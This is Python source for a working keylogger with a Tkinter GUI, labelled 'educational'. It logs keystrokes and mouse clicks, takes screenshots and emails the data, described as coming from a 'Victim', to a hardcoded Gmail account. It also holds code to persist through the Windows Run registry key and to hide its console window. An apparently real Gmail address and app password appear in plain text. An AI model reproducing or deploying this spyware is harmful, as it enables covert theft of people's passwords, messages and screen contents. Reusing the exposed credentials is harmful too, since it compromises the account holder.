import sys, os, time, random, smtplib, string, base64, threading
from winreg import *  # for addStartup function
import win32console, win32gui
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pynput import keyboard, mouse
import pyautogui
import tkinter as tk
from tkinter import scrolledtext, messagebox

# --------------- CONFIGURATION ---------------
yourgmail = "alicetsm1@gmail.com"
yourgmailpass = "bygb jayl gnzm vyry"
sendto = "alicetsm1@gmail.com"
interval = 60
# --------------------------------------------

t = ""
start_time = time.time()
pics_names = []
log_active = False

def write_log_to_file():
    global t
    if t.strip():  # only write if there's any data
        with open("Logfile.txt", "a") as f:
            f.write(t)
        t = ""

def addStartup():
    try:
        fp = os.path.dirname(os.path.realpath(__file__))
        file_name = sys.argv[0].split('\\')[-1]
        new_file_path = os.path.join(fp, file_name)
        key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
        SetValueEx(key, 'MyKeylogger', 0, REG_SZ, new_file_path)
        messagebox.showinfo("Startup", "Keylogger added to startup successfully.")
    except Exception as e:
        messagebox.showerror("Startup Error", f"Failed to add to startup:\n{e}")


def Hide():
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def ScreenShot():
    name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(7)) + '.png'
    pyautogui.screenshot().save(name)
    pics_names.append(name)

def Mail_it(data, pics_names):
    try:
        msg = MIMEMultipart()
        msg['From'] = yourgmail
        msg['To'] = sendto
        msg['Subject'] = "Keylogger Report"

        body = base64.b64encode(data.encode()).decode()
        msg.attach(MIMEText("New Data from Victim (Base64 Encoded):\n" + body))

        for pic in pics_names:
            part = MIMEBase('application', 'octet-stream')
            with open(pic, 'rb') as file:
                part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{pic}"')
            msg.attach(part)

        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(yourgmail, yourgmailpass)
        server.sendmail(yourgmail, sendto, msg.as_string())
        server.quit()

        # Clear after successful send
        pics_names.clear()
    except Exception as e:
        print("Error sending email:", e)

def on_press(key):
    global t, start_time
    if not log_active:
        return
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    data = f"\n[{time.ctime().split(' ')[3]}] Keyboard Key: {key_str}\n===================="
    t += data
    update_gui(data)
    if len(t) > 500:
        with open("Logfile.txt", "a") as f:
            f.write(t)
        t = ""
    if time.time() - start_time >= interval:
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ""

def on_click(x, y, button, pressed):
    global t, start_time
    if not log_active or not pressed:
        return
    data = f"\n[{time.ctime().split(' ')[3]}] Mouse Click at {(x, y)} with {button}\n===================="
    t += data
    update_gui(data)
    if len(t) > 300:
        ScreenShot()
    if len(t) > 500:
        with open("Logfile.txt", "a") as f:
            f.write(t)
        t = ""
    if time.time() - start_time >= interval:
        Mail_it(t, pics_names)
        start_time = time.time()
        t = ""

def start_listeners():
    keyboard_listener = keyboard.Listener(on_press=on_press)
    mouse_listener = mouse.Listener(on_click=on_click)
    keyboard_listener.start()
    mouse_listener.start()

# ---------------- GUI Section ----------------

def update_gui(text):
    text_area.configure(state='normal')
    text_area.insert(tk.END, text)
    text_area.see(tk.END)
    text_area.configure(state='disabled')

def toggle_logger():
    global log_active
    if log_active:
        write_log_to_file()  # Save before turning off
    log_active = not log_active
    status_label.config(text="Logging: ON" if log_active else "Logging: OFF")
    toggle_btn.config(text="Stop Logging" if log_active else "Start Logging")

def send_email_now():
    write_log_to_file()  # This writes and resets t
    with open("Logfile.txt", "r") as f:
        data = f.read()
    Mail_it(data, pics_names)
    messagebox.showinfo("Email Sent", "Logs and screenshots (if any) were emailed.")

def take_screenshot_now():
    ScreenShot()
    messagebox.showinfo("Screenshot", "Screenshot captured.")

# --------------------------------------------

# Main GUI Setup
root = tk.Tk()
root.title("Educational Keylogger (Tkinter GUI)")
root.geometry("700x500")

frame = tk.Frame(root)
frame.pack(pady=10)

toggle_btn = tk.Button(frame, text="Start Logging", command=toggle_logger, width=15)
toggle_btn.grid(row=0, column=0, padx=10)

screenshot_btn = tk.Button(frame, text="Take Screenshot", command=take_screenshot_now, width=15)
screenshot_btn.grid(row=0, column=1, padx=10)

email_btn = tk.Button(frame, text="Send Logs Now", command=send_email_now, width=15)
email_btn.grid(row=0, column=2, padx=10)

status_label = tk.Label(root, text="Logging: OFF", fg="blue")
status_label.pack()

text_area = scrolledtext.ScrolledText(root, width=80, height=20, state='disabled')
text_area.pack(pady=10)

startup_btn = tk.Button(frame, text="Add to Startup", command=addStartup, width=15)
startup_btn.grid(row=0, column=3, padx=10)


# Optional startup and hiding
#addStartup()
#Hide()

# Start background listeners in a thread
threading.Thread(target=start_listeners, daemon=True).start()

def on_exit():
    write_log_to_file()
    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_exit)
root.mainloop()
